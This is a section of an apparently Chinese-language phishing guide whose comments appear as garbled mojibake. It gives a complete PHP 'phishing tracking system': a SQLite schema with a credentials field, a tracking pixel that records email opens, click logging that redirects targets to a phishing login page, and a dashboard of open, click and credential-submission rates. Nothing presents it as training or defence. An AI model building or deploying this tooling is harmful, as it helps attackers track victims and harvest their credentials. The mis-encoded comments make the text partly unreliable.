### 6.4 è¿½è¸ªç³»ç»Ÿæ­å»º

```php
<!-- infrastructure/tracking_system.php -->
<?php
/**
 * é’“é±¼è¿½è¸ªç³»ç»Ÿ - å®æ—¶ç›‘æ§ç‚¹å‡»/è®¿é—®
 */

$tracking_db = '/var/log/phish/tracking.db';

// åˆå§‹åŒ–æ•°æ®åº“
function init_db() {
    global $tracking_db;
    $db = new SQLite3($tracking_db);
    
    $db->exec('CREATE TABLE IF NOT EXISTS visits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        tracking_token VARCHAR(32),
        target_email VARCHAR(255),
        ip_address VARCHAR(45),
        user_agent TEXT,
        referer TEXT,
        country VARCHAR(2),
        city VARCHAR(100),
        opened BOOLEAN DEFAULT 0,
        clicked BOOLEAN DEFAULT 0,
        submitted BOOLEAN DEFAULT 0,
        credentials TEXT
    )');
    
    $db->exec('CREATE TABLE IF NOT EXISTS clicks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        tracking_token VARCHAR(32),
        element VARCHAR(100),
        page VARCHAR(255)
    )');
}

// è®°å½•é‚®ä»¶æ‰“å¼€ï¼ˆè¿½è¸ªåƒç´ ï¼‰
if ($_GET['action'] == 'pixel') {
    $token = $_GET['token'] ?? '';
    $db = new SQLite3($tracking_db);
    $stmt = $db->prepare('UPDATE visits SET opened=1 WHERE tracking_token=?');
    $stmt->bindValue(1, $token);
    $stmt->execute();
    
    // è¿”å›1x1é€æ˜å›¾ç‰‡
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=');
    exit;
}

// è®°å½•é“¾æ¥ç‚¹å‡»
if ($_GET['action'] == 'click') {
    $token = $_GET['token'] ?? '';
    $element = $_GET['el'] ?? 'unknown';
    
    $db = new SQLite3($tracking_db);
    $stmt = $db->prepare('INSERT INTO clicks (tracking_token, element) VALUES (?, ?)');
    $stmt->bindValue(1, $token);
    $stmt->bindValue(2, $element);
    $stmt->execute();
    
    $stmt = $db->prepare('UPDATE visits SET clicked=1 WHERE tracking_token=?');
    $stmt->bindValue(1, $token);
    $stmt->execute();
    
    // è·³è½¬åˆ°é’“é±¼é¡µé¢
    header('Location: /login.php?token=' . urlencode($token));
    exit;
}

// å®æ—¶ç»Ÿè®¡ä»ªè¡¨æ¿
if ($_GET['action'] == 'dashboard') {
    $db = new SQLite3($tracking_db);
    
    $stats = [
        'total_sent' => $db->querySingle('SELECT COUNT(*) FROM visits'),
        'opened' => $db->querySingle('SELECT COUNT(*) FROM visits WHERE opened=1'),
        'clicked' => $db->querySingle('SELECT COUNT(*) FROM visits WHERE clicked=1'),
        'submitted' => $db->querySingle('SELECT COUNT(*) FROM visits WHERE submitted=1'),
    ];
    
    $stats['open_rate'] = $stats['total_sent'] > 0 ? 
        round($stats['opened'] / $stats['total_sent'] * 100, 2) : 0;
    $stats['click_rate'] = $stats['opened'] > 0 ? 
        round($stats['clicked'] / $stats['opened'] * 100, 2) : 0;
    $stats['submit_rate'] = $stats['clicked'] > 0 ? 
        round($stats['submitted'] / $stats['clicked'] * 100, 2) : 0;
    
    header('Content-Type: application/json');
    echo json_encode($stats);
    exit;
}
?>

